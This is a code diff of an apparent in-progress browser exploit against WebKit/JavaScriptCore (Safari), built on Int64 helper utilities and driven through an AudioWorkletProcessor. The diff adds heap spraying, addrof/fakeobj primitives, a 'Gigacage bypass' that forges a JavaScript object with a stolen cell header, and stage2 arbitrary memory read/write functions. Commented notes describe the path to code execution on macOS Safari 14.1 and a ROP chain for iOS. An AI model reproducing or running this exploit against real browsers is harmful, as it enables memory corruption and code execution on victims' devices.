@@ -3,29 +3,37 @@
 //
 // Copyright (c) 2016 Samuel Groß
 //
+
 // Return the hexadecimal representation of the given byte.
 function hex(b) {
     return ('0' + b.toString(16)).substr(-2);
 }
+
 // Return the hexadecimal representation of the given byte array.
 function hexlify(bytes) {
     var res = [];
     for (var i = 0; i < bytes.length; i++)
         res.push(hex(bytes[i]));
+
     return res.join('');
 }
+
 // Return the binary data represented by the given hexdecimal string.
 function unhexlify(hexstr) {
     if (hexstr.length % 2 == 1)
         throw new TypeError("Invalid hex string");
+
     var bytes = new Uint8Array(hexstr.length / 2);
     for (var i = 0; i < hexstr.length; i += 2)
         bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);
+
     return bytes;
 }
+
 function hexdump(data) {
     if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
         data = Array.from(data);
+
     var lines = [];
     for (var i = 0; i < data.length; i += 16) {
         var chunk = data.slice(i, i+16);
@@ -34,8 +42,10 @@ function hexdump(data) {
             parts.splice(8, 0, ' ');
         lines.push(parts.join(' '));
     }
+
     return lines.join('\n');
 }
+
 // Simplified version of the similarly named python module.
 var Struct = (function() {
     // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
@@ -43,28 +53,35 @@ var Struct = (function() {
     var byteView    = new Uint8Array(buffer);
     var uint32View  = new Uint32Array(buffer);
     var float64View = new Float64Array(buffer);
+
     return {
         pack: function(type, value) {
             var view = type;        // See below
             view[0] = value;
             return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
         },
+
         unpack: function(type, bytes) {
             if (bytes.length !== type.BYTES_PER_ELEMENT)
                 throw Error("Invalid bytearray");
+
             var view = type;        // See below
             byteView.set(bytes);
             return view[0];
         },
+
         // Available types.
         int8:    byteView,
         int32:   uint32View,
         float64: float64View
     };
 })();
+
+
 function ab2str(buf) {
   return String.fromCharCode.apply(null, new Uint16Array(buf));
 }
+
 function str2ab(str) {
   var buf = new ArrayBuffer(str.length*2); // 2 bytes for each char
   var bufView = new Uint16Array(buf);
@@ -73,6 +90,8 @@ function str2ab(str) {
   }
   return buf;
 }
+
+
    
 //
 // Tiny module that provides big (64bit) integers.
@@ -81,12 +100,14 @@ function str2ab(str) {
 //
 // Requires utils.js
 //
+
 // Datatype to represent 64-bit integers.
 //
 // Internally, the integer is stored as a Uint8Array in little endian byte order.
 function Int64(v) {
     // The underlying byte array.
     var bytes = new Uint8Array(8);
+
     switch (typeof v) {
         case 'number':
             v = '0x' + Math.floor(v).toString(16);
@@ -95,6 +116,7 @@ function Int64(v) {
                 v = v.substr(2);
             if (v.length % 2 == 1)
                 v = '0' + v;
+
             var bigEndian = unhexlify(v, 8);
             bytes.set(Array.from(bigEndian).reverse());
             break;
@@ -112,47 +134,58 @@ function Int64(v) {
         default:
             throw TypeError("Int64 constructor requires an argument.");
     }
+
     // Return a double whith the same underlying bit representation.
     this.asDouble = function() {
         // Check for NaN
         if (bytes[7] == 0xff && (bytes[6] == 0xfc || bytes[6] == 0xfc))
             throw new RangeError("Integer can not be represented by a double");
+
         return Struct.unpack(Struct.float64, bytes);
     };
+
     // Return a javascript value with the same underlying bit representation.
     // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
     // due to double conversion constraints.
     this.asJSValue = function() {
         if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xfe))
             throw new RangeError("Integer can not be represented by a JSValue");
+
         // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
         this.assignSub(this, 0x2000000000000);
         var res = Struct.unpack(Struct.float64, bytes);
         this.assignAdd(this, 0x2000000000000);
+
         return res;
     };
+
     // Return the underlying bytes of this number as array.
     this.bytes = function() {
         return Array.from(bytes);
     };
+
     // Return the byte at the given index.
     this.byteAt = function(i) {
         return bytes[i];
     };
+
     // Return the value of this number as unsigned hex string.
     this.toString = function() {
         return '0x' + hexlify(Array.from(bytes).reverse());
     };
+
     this.lo = function()
     {
         var b = this.bytes();
         return (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0;
     };
+
     this.hi = function()
     {
         var b = this.bytes();
         return (b[4] | (b[5] << 8) | (b[6] << 16) | (b[7] << 24)) >>> 0;
     };
+
     this.asInt32 = function() {
         var value = new Int64(0);
         for (var i = 0; i < 8; i++) {
@@ -178,8 +211,10 @@ function Int64(v) {
         
         return parseInt('0x' + hexlify(Array.from(value.bytes).reverse()).slice(-8));
     };
+
     // Basic arithmetic.
     // These functions assign the result of the computation to their 'this' object.
+
     // Decorator for Int64 instance operations. Takes care
     // of converting arguments to Int64 instances if required.
     function operation(f, nargs) {
@@ -192,12 +227,15 @@ function Int64(v) {
             return f.apply(this, arguments);
         };
     }
+
     // this = -n (two's complement)
     this.assignNeg = operation(function neg(n) {
         for (var i = 0; i < 8; i++)
             bytes[i] = ~n.byteAt(i);
+
         return this.assignAdd(this, Int64.One);
     }, 1);
+
     // this = a + b
     this.assignAdd = operation(function add(a, b) {
         var carry = 0;
@@ -208,6 +246,7 @@ function Int64(v) {
         }
         return this;
     }, 2);
+
     // this = a - b
     this.assignSub = operation(function sub(a, b) {
         var carry = 0;
@@ -218,6 +257,7 @@ function Int64(v) {
         }
         return this;
     }, 2);
+
      // this = a ^ b
     this.assignXor = operation(function xor(a, b) {
         for (var i = 0; i < 8; i++) {
@@ -226,6 +266,7 @@ function Int64(v) {
         return this;
     }, 2);
     
+
     // this = a << b
     this.assignShiftLeft = operation(function shiftLeft(a, b) {
         for (var i = 0; i < 8; i++) {
@@ -250,40 +291,51 @@ function Int64(v) {
         return this;
     }, 2);
 }
+
 // Constructs a new Int64 instance with the same bit representation as the provided double.
 Int64.fromDouble = function(d) {
     var bytes = Struct.pack(Struct.float64, d);
     return new Int64(bytes);
 };
+
 // Convenience functions. These allocate a new Int64 to hold the result.
+
 // Return -n (two's complement)
 function Neg(n) {
     return (new Int64()).assignNeg(n);
 }
+
 // Return a + b
 function Add(a, b) {
     return (new Int64()).assignAdd(a, b);
 }
+
 // Return a - b
 function Sub(a, b) {
     return (new Int64()).assignSub(a, b);
 }
+
 // Return a ^ b
 function Xor(a, b) {
     return (new Int64()).assignXor(a, b);
 }
+
 // Return a << b
 function ShiftLeft(a, b) {
     return (new Int64()).assignShiftLeft(a, b);
 }
+
 // Return a >> b
 function ShiftRight(a, b) {
     return (new Int64()).assignShiftRight(a, b);
 }
+
 // Some commonly used numbers.
 Int64.Zero = new Int64(0);
 Int64.One = new Int64(1);
+
 // That's all the arithmetic we need for exploiting WebKit.. :)
+
 function sleep( sleepDuration ){
     var now = new Date().getTime();
     while(new Date().getTime() < now + sleepDuration){ /* do nothing */ } 
@@ -293,6 +345,7 @@ function gc1() {
             new ArrayBuffer(0x1000000);
         }
 }
+
 function strcmp(b, str)
 {
     var fn = typeof b == "function" ? b : function(i) { return b[i]; };
@@ -315,6 +368,9 @@ function hex_to_ascii(str1)
 	}
 	return str;
  }
+
+
+
       function hex1(x) {
     if (x < 0)
         return `-${hex1(-x)}`;
@@ -337,6 +393,7 @@ var qwordAsFloat = qword => { //i2f
     return data_view.getFloat64(0, true);
 }
       const kBoxedDoubleOffset = 0x0002000000000000n;
+
     var array_spray = [];
     for (var i = 0; i < 1000; ++i) {
         array_spray[i] = [13.37+i, 13.37];
@@ -384,6 +441,7 @@ for (var i = 0; i < 1000; ++i) {
       let addrof = null;
       for (var i = 0; i < 100; i++) keep.push([1.1*i]);
       let a0 = [0,0,0,0,0,0,0,0,0,0];
+
       let a1 = [0,0,0,0,0,0,0,0,0,0];
       // transition to unboxed double storage
       a1[3] = 13.37;
@@ -399,6 +457,7 @@ for (var i = 0; i < 1000; ++i) {
           port.postMessage("Failure on array length");
           return;
         }
+
         //const kSentinel = 1333.337;
         var kSentinel = qwordAsFloat(0x41414141414141)
         let offset = -1;
@@ -419,14 +478,27 @@ for (var i = 0; i < 1000; ++i) {
         // temporary implementations
         addrof = (val) => {
           b1[0] = val;
-          return new Int64.fromDouble(a1[offset]);
+          return floatAsQword(a1[offset]);
         }
         fakeobj = (addr) => {
           a1[offset] = qwordAsFloat(addr);
-          return new Int64(b1[0]).asDouble();
+          return b1[0];
         }
         var victim1 = structure_spray[510];
-	@@ -502,9 +502,9 @@ for (var i = 0; i < 1000; ++i) {
+        // Gigacage bypass: Forge a JSObject which has its butterfly pointing
+        // to victim
+        var boxed1 = [{}];
+        var print = (msg) => {
+          port.postMessage(msg);
+        }
+        print("unboxed @ " + hex1(addrof(unboxed1)));
+        print("boxed @ " + hex1(addrof(boxed1)));
+
+    var container = {
+        header: qwordAsTagged(0x0108230900000000), // cell
+        butterfly: victim1, // butterfly
+    };
+    var unboxed = [13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37];
     unboxed = 4.2; // Disable/undo CopyOnWrite (forced to make new Array which is ArrayWithDouble)
     var boxed = [{}];
 
@@ -436,12 +508,35 @@ for (var i = 0; i < 1000; ++i) {
     print("we have hax object ;)");
     print("after further work we can use this object for arbitrary r/w");
     print("now lets steal a real JSCellHeader")
-	@@ -535,7 +535,7 @@ for (var i = 0; i < 1000; ++i) {
+    // Can now simply read a legitimate JSCell header and use it.
+    var js_header = hax[0];
+    container.header = js_header; 
+    //print("Stolen Real Cell Header: " + hex1(floatAsQword(js_header)))
+    
+    // Can read/write to memory now by corrupting the butterfly
+    // pointer of the float array.
+    //hax[1] = 3.54484805889626e-310;    // 0x414141414141 in hex
+    //victim1[0] = 1337;
+    let results = [];
+    for (let i = 0; i < 2; i++) {
+        let a = i == 0 ? hax : victim1;
+        results.push(a[0]);
+    }
+    jscell_header = results[0];
+    print("Stolen Real Cell Header: " + hex1(floatAsQword(js_header)))
+      
+    var stage2 = {
+        addrof: function(obj) {
+            return addrof(obj)
+        },
+
+        fakeobj: function(addr) {
+            return fakeobj(addr)
         },
 
         write64: function(where, what) {
-            hax[1] = new Int64(where + 0x10).asDouble();
-            victim1.prop = this.fakeobj(new Int64(what).asDouble());
+            hax[1] = qwordAsFloat(where + 0x10);
+            victim1.prop = this.fakeobj(qwordAsFloat(what));
         },
 
         read64: function(where,offset) {
@@ -450,7 +545,7 @@ for (var i = 0; i < 1000; ++i) {
                 offset *= 8
                 return this.read64(where+offset);
             }
-            hax[1] = new Int64(where + 0x10).asDouble();
+            hax[1] = qwordAsFloat(where + 0x10);
             var res = this.addrof(victim1.prop);
             //hax[1] = reset;
             //victim1.prop = shared_butterfly;
@@ -458,7 +553,7 @@ for (var i = 0; i < 1000; ++i) {
         },
         readInt64: function(where) {
             //var reset = hax[1];
-            hax[1] = new Int64(where + 0x10).asDouble();
+            hax[1] = qwordAsFloat(where + 0x10);
             var res = this.addrof(victim1.prop);
             //hax[1] = reset;
             //victim1.prop = shared_butterfly;
@@ -467,8 +562,10 @@ for (var i = 0; i < 1000; ++i) {
         write(addr, data) {
             while (data.length % 4 != 0)
                 data.push(0);
+
             var bytes = new Uint8Array(data);
             var ints = new Uint16Array(bytes.buffer);
+
             for (var i = 0; i < ints.length; i++)
                 this.write64(Add(addr, 2 * i), ints[i]);
         },
@@ -477,18 +574,23 @@ for (var i = 0; i < 1000; ++i) {
             var a = new Array(length);
             var i;
             var v;
+
             for (i = 0; i + 8 < length; i += 8) {
-                v = this.read64(addr + i).bytes()
+                v = new Int64(this.read64(addr + i)).bytes()
                 for (var j = 0; j < 8; j++) {
                     a[i+j] = v[j];
                 }
             }
-            v = this.read64(addr + i).bytes()
+
+            v = new Int64(this.read64(addr + i)).bytes()
             for (var j = i; j < length; j++) {
                 a[j] = v[j - i];
             }
+
             return a
+
         },
+
         test: function() {
             var addr = this.addrof({a: 0x1337});
             var x = this.fakeobj(addr);
@@ -496,6 +598,7 @@ for (var i = 0; i < 1000; ++i) {
             if (hex1(x.a) != 0x1337) {
                 print('stage2 addrof/fakeobj does not work');
             }
+
             var val = 0x42424242;
             //this.write64(0x4141414141,0x999999999)
             //this.read64(0x999999)
@@ -504,10 +607,12 @@ for (var i = 0; i < 1000; ++i) {
             if (qwordAsFloat(val) != unboxed1[1]) {
                 print('stage2 write does not work');
             }
+
             if (this.read64(shared_butterfly + 8) != 0x42424242) {
                 print('stage2 read does not work');
             }
         },
+
         clear: function() {
             outer = null;
             hax = null;
@@ -521,8 +626,7 @@ for (var i = 0; i < 1000; ++i) {
     var bb = {};
         //bb[0] = 1.1
         var bbaddr = stage2.addrof(bb);
-        print("object address @ " + bbaddr);
-	
+        print("object address @ " + hex1(bbaddr));
         var footeraddr = ((bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000)+0x4000-0x130) 
         //refer to VM.h this is
         //JSC::MarkedBlock::footer at offset 8 should be the vm struct
@@ -553,14 +657,9 @@ function i2i(i,num) {
     i32[1] = i / BASE32
     return i[num]
 }
-	var hdr = anchor - (i2i(anchor,1) & 0xfff);
-	print("header" + hex1(hdr));
-	      
-	      
-	//let split = new Uint32Array(2);
-	//split = anchor
-	//var hdr = split[1] - (split[1] & 0xfff);
-	//print("header @ " + hex1(hdr))
+    var hdr = anchor - (i2i(anchor,1) & 0xfff);
+    print("header" + hex1(hdr));
+
 	//var vtabledump = stage2.read(vtable,0x60);
 	//print("dump" + hexdump(vtabledump));
 	//stage2.write64(hex1(vtable),0x7777);
@@ -570,6 +669,8 @@ function i2i(i,num) {
         //print(hexdump(stage2.read(vtable,0x100)));
         //var anchor = stage2.read64(vtable);
         //print("anchor @ " + hex1(anchor))
+
+
         //print(hex1(test2));
         //print(hex1(test3))
         //var runloop = stage2.read64(vmaddr+0);
@@ -616,8 +717,10 @@ function i2i(i,num) {
                 break;
             }
         }*/
+
         
         //stage2.write64(hdr,0x41414141);
+
         /*var vmstruct = stage2.read64(MarkBlockvm);
         print("vmstruct @ " + hex1(vmstruct))
         var runloop = stage2.read64(vmstruct+0x18);
@@ -634,6 +737,7 @@ function i2i(i,num) {
         var vtable = stage2.read64(runloop);
         print("vtable @ " + hex1(vtable));*/
         //stage2.write64(vtable,0)
+
         /*var runloop = stage2.read64(footeraddr); //? right vm struct
         print("Struct guess #2 @ " + hex1(runloop))
         var realrunloop = stage2.read64(runloop);
@@ -649,6 +753,7 @@ function i2i(i,num) {
         print("vm struct @ " + hex1(toHexString(vm)));
         var m_runloop = stage2.read64(hex1(toHexString(vm)));
         print(hex1(m_runloop))*/
+
         //var m_runloop = stage2.read64(vm+0x18);
         //print("m_runloop @ " + hex1(m_runloop))
         //var vtable = stage2.read64(m_runloop);
@@ -812,6 +917,7 @@ function i2i(i,num) {
             unboxed1 = null
         },
     }; */
+
     /*
     //stage2.test();
             var v = 0x4141;
@@ -945,10 +1051,13 @@ function i2i(i,num) {
         //print("after removing bitmask +0x4000-0x128" + (hex1(stage2.read64(hex1(bbaddr)&0xffffc000))+0x4000-0x128))
         //p/x sizeof(JSC::MarkedBlock::Footer) = 0x128
         //MarkedBlock size 0x4000 bytes large
+
         //offset of m_vm is last + number
         //var vm = stage2.read64((bbaddr & 0xffffffffffffc000)+0x4000+0x128+8)//+0x8;
         //print("vm address?" + hex1(vm))
         //stage2.write64(vm,0x414141441414)
+
+
         /*print("We have stable memory rw primitives run this exploit on MacOS with \n" + "A version that has Safari 14.1 and it will yield you code execution...\n"+
         "Right now iOS doesn't have rwx memory for JIT so we will need a ROP Chain\n"+
         "which will require a shared cache parser that utilizes our memory rw\n"+
@@ -1010,6 +1119,7 @@ function i2i(i,num) {
         }
     }
     print(detectOS())*/
+
 /*ready.then(function() {
     try {
         pwn();
@@ -1069,7 +1179,9 @@ function i2i(i,num) {
             //staged2read64(rwx)
             //var i = new Uint32Array(64);
             //i = (rwx % 0x100000000);
+
             //port.postMessage(hex1(rwx) + " lo " + hex1((rwx)))
+
             //port.postMessage(ShiftRight(new Int64(hex1(rwx)),4))
             //stage2.write64(exe,0x55555555)
             //stage2.write64(mathfunc,0x4141414141)
@@ -1083,8 +1195,11 @@ function i2i(i,num) {
             }*/
             
             //var propertyAddr = addr;
+
             //var value = stage2.read(addr,8);
             //port.postMessage("value" + value)
+
+
         /*var addr1 = addrof({a:0x1337});
         var fb = fakeobj(addr1)
         port.postMessage("addrof {}" + hex1(fb.a))
@@ -1134,6 +1249,7 @@ function i2i(i,num) {
           b1[offset] = val;
           return floatAsQword(a1[0]);
         }*/ 
+
       }
       function pwn() {
         try {
@@ -1153,6 +1269,7 @@ function i2i(i,num) {
           port = new AudioWorkletProcessor().port;
           //port1 = new AudioWorkletProcessor().port;
           port.onmessage = pwn;
+
           // this part is magic
           // put 0xfffe000000001337 in the fastMalloc heap to fake the butterfly sizes
           eval('1 + 0x1336');
